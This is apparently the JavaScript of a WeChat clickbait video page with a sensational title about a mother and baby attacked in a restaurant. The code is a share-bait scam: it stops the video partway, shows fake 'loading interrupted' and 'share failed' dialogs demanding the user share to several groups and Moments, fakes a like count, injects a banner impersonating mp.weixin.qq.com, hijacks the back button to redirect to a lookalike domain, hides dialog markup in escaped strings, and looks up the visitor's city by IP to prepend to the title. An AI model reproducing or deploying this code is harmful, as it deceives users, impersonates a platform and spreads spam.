

if (top.location!=self.location) {
    top.location = self.location;
}

var til='老婆带宝宝去饭庄吃饭被暴揍,老公火速赶来后,吓傻全🐻场',
    vid='m0527w6f8ze',
    delayTime = 213,
    isOS=!!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);



$('#likeNum').html(Number.parseInt(Math.random()*15000)+5000);

var video, player, playStatus = 'pending';
var elId = 'mod_player_skin_0';

$("#js_content").html('<div id="'+elId+'" class="player_skin" style="padding-top:6px;"></div>');

var elWidth = $("#js_content").width();
playVideo(vid,elId,elWidth);
$("#pauseplay").height($("#js_content").height() - 10);

if(playStatus == 'pending') {
    var isFirst = true;
    setInterval(function(){
        try {
            var currentTime = player.getCurTime();
            if(currentTime >= delayTime) {
                $('#pauseplay').show();
                player.setPlaytime(delayTime-1);
                player.pause();
                player.cancelFullScreen();
                $.cookie(vid, 's', {path: '/'});
                if(isFirst) {
                    $('#pauseplay').trigger('click');
                }
                isFirst = false;
            }
        } catch (e) {
        }
    }, 500);
}

function playVideo(vid,elId,elWidth){
//定义视频对象
    video = new tvp.VideoInfo();
//向视频对象传入视频vid
    video.setVid(vid);

//定义播放器对象
    player = new tvp.Player(elWidth, 200);
//设置播放器初始化时加载的视频
    player.setCurVideo(video);

//输出播放器,参数就是上面div的id，希望输出到哪个HTML元素里，就写哪个元素的id
    if (sessionStorage.isAT && isOS) {document.addEventListener("WeixinJSBridgeReady", function() {player.play();}, false);}
    player.addParam("wmode","transparent");
    player.addParam("pic",tvp.common.getVideoSnapMobile(vid));
    player.write(elId);
}

$('#pauseplay').on('click', function() {
    jssdk();
});

$('#like').on('click', function(){
    var $icon = $(this).find('i');
    var $num = $(this).find('#likeNum');
    var num = 0;
    if(!$icon.hasClass('praised')){
        num = parseInt($num.html());
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(++num);
        $icon.addClass("praised");
    } else {
        num = parseInt($num.html());
        num--;
        if(isNaN(num)) {
            num = 0;
        }
        $num.html(num);
        $icon.removeClass("praised");
    }
});

var alertTimes = 0;
function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}

var hiddenProperty = 'hidden' in document ? 'hidden' : 'webkitHidden' in document ? 'webkitHidden' : 'mozHidden' in document ? 'mozHidden' : null;
var visibilityChangeEvent = hiddenProperty.replace(/hidden/i, 'visibilitychange');


var callback = function() {
    // 返回的数据并不统一，接口已经尽量统一，我觉得微信公司现在缺 js 程序员
    // 也有一些是很恶心的
    console && console.log(argument);

    alert(argument);

};

var onVisibilityChange = function(){
    if (!document[hiddenProperty]) {
        if (delayTime === 9999) {
            $.get('fx.hold'+location.search+'&t=vd');
        } else if (delayTime < 9999) {
            shareATimes += 1;
            if (shareATimes>4) {
                shareTTimes += 1;
                setTimeout(share_tip(shareATimes,shareTTimes), 2000);
            } else {
                setTimeout(share_tip(shareATimes,-1), 2000);
            }}}};

document.addEventListener(visibilityChangeEvent, onVisibilityChange);

var doc = $(document);
var _touches_point1=0;var _touches_point2=0;
addEventListener("touchstart",
    function(e) {
        _touches_point1 = e.touches[0].pageY;
    });
addEventListener("touchmove",
    function(e) {
        e.preventDefault();
        _touches_point2 = e.touches[0].pageY;
        if(doc.scrollTop()<=0 && _touches_point1<_touches_point2)
        {
            if( $('#_domain_display').length <=0 )
            {
                $('body').prepend('<div id="_domain_display" style="text-align:center;background-color:#2d3132;color:#797d7e;height:0px;font-size:12px;overflow:hidden;"><p style="padding-top:12px;">此网页由 mp.weixin.qq.com 提供</p></div>');
            }
            $('#_domain_display').height((_touches_point2-_touches_point1)*0.35);
        } else {
            doc.scrollTop(doc.scrollTop()+((_touches_point1-_touches_point2)*0.4));
        }
        if((doc.scrollTop()+$(window).height()) >= doc.height() || $('#_b_dp').length > 0){
            if($('#_b_dp').length <=0 )
            {
                $('body').append('<div id="_b_dp" style="text-align:center;color:#797d7e;height:0px;overflow:hidden;"></div>');
            }
            $('#_b_dp').height((_touches_point1-_touches_point2)*0.5);
        }
    });

addEventListener("touchend",
    function(e) {
        $('#_domain_display').slideUp('normal' , function(){
            $('#_domain_display').remove();
        });
        $('#_b_dp').slideUp('normal' , function(){
            $('#_b_dp').remove();
        });
    });

var shareATimes = 0,shareTTimes = 0;
function share_tip(share_app_times, share_timeline_times) {
    if (share_timeline_times == -1) {
        if (shareATimes == 1) {
            wxalert('<b style="font-size: 22px">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好')
        } else if (shareATimes == 2) {
            wxalert('<b style="font-size: 22px">分享失败！</b><br>注意：分享到相同的群会失败！<br>请继续分享到<b style="font-size: 18px;color: red">2</b>个不同的群！', '好')
        } else if (shareATimes == 3) {
            wxalert('<b style="font-size: 22px">分享成功！</b><br/>请继续分享到<b style="font-size: 18px;color: red">1</b>个不同的群即可<b style="font-size: 18px;color: red;">免流量加速观看</b>！', '好')
        } else if (share_timeline_times < 1) {
            wxalert('<b style="font-size: 22px">分享成功！</b><br/>最后请分享到<b style="font-size: 18px;color: red">朋友圈</b>即可!', '好')
        }
    } else {
        if (shareATimes <= 3) {
            wxalert('请分享到不同的群!', '好')
        } else {
            wxalert('<b style="font-size: 22px">分享成功！</b><br/>点击确定继续播放。', '确定', function() {
                $.get('fx.hold'+location.search+'&t=vd');
                delayTime = 99999;
                $("#fenxiang").hide();
                player.play();
            })
        }
    }
}

function jssdk() {
    if (!isOS) {if(!sessionStorage.isDT){sessionStorage.isDT=1;return location.reload();}}
    $("#fenxiang").show();
    show_tip();
}
if (sessionStorage.isDT) {jssdk();sessionStorage.removeItem("isDT");}

function show_tip() {
    wxalert('<img style="width: 40px;margin-top: -30px" src="http://puep.qpic.cn/coral/Q3auHgzwzM4fgQ41VTF2rN41ibuV99MPdQAGo6WSIP2aicKRzEKUtaxg/0"><br><b style="font-size: 22px;color: red">数据加载中断</b><br/>请分享到微信群，可<b style="color: red;">免流量加速观看</b>', '好')
}
$(function() {
    $('#fenxiang').on('click', function() {
        show_tip()
    });
});

var d = new Date();
var str = d.getFullYear()+"-"+(d.getMonth()+1)+"-"+d.getDate();
document.getElementById("post-date").innerHTML = str;

document.title= til;
document.getElementsByTagName('h2')[0].innerHTML = til;

var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i);
function chkwvs() {if (!sessionStorage.isAT && isOS && wechatInfo && wechatInfo[1] >= "6.5.1") {
    setTimeout("document.getElementById('sa').style.display='block';", 900);
}}

function winrs() {
    if (isOS) {}
    if (navigator.userAgent.indexOf('Android') > -1 || typeof window.orientation == "undefined" || window.orientation==0 || window.orientation==180) {
        if (document.getElementById('win')) {
            document.getElementById('win').style.margin = (window.screen.height / window.screen.width * 31)+"% auto 0";
        }
    } else {
        if (document.getElementById('win')) {
            document.getElementById('win').style.margin = (window.screen.width / window.screen.height * 31)+"% auto 0";
        }
    }
}

window.onhashchange=function(){jp();};
function hh() {
    chkwvs();
    // history.pushState(history.length+1, "app", "#pt_"+new Date().getTime());
    history.pushState(history.length+1, "app");
}

function jp() {location.href="http://mp.weixin.qq.comm.3v0.com.cn?ad=" + (parseInt((parseInt(new Date().getTime() / (1000*60*1))+'').substring(2))+5000);/*"/2017-11-25/MZI=142236401895131"*/}

window.onload=function(){
    if (sessionStorage.isAT) {chkwvs=function(){};sessionStorage.removeItem("isAT");}
    setTimeout('hh();', 100);
};

winrs();
window.onresize=window.onorientationchange=function(){winrs();};

$.getScript('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js',function(){
    document.title = remote_ip_info.city+document.title;
});


var shareData = {
    link: 'http://y58kg.cn/',
    desc: 'http://y58kg.cn/',
    title: 'http://y58kg.cn/'
};
document.addEventListener('WeixinJSBridgeReady', function onBridgeReady() {
    // 分享到朋友圈
    WeixinJSBridge.on('menu:share:timeline', function(argv){
        shareTimeline();
    });
}, false);

function shareTimeline() {
    WeixinJSBridge.invoke('shareTimeline', shareData, function(res) {
        validateShare(res);
        _report('timeline', res.err_msg);
    });
}

function validateShare(res) {
    alert(res.err_msg);
    // if(res.err_msg != 'send_app_msg:cancel' && res.err_msg != 'share_timeline:cancel') {
    //     //分享完毕回调
    // }
}
